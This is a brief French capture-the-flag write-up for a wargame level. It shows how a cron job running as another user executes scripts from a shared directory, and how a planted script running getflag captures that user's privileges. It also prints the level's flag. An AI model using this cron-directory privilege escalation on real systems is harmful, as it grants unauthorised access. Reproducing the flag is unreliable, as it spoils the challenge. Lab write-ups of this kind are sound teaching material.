Dans ce niveau des qu'on se connecte on recoit une notif comme quoi on a un mail

On affiche les ```env``` et on voit ```MAIL=/var/mail/level05```

On se rend la bas et on affiche le fichier ```cat level05```

Il y a une commande cron ```*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05``` 

On va voir le script execute tte les 2 min dans ```/usr/sbin/openarenaserver```

Il execute tt les fichier de ce dossier : ```/opt/openarenaserver/``` et les supprime ensuite

On va donc rediriger un script pour recup le flag avec ```echo -e '#!/bin/sh\ngetflag > /tmp/res.txt' > test.sh```

Et dans ```/tmp/res.txt``` on a le flag ```viuaaale9huek52boumoomioc```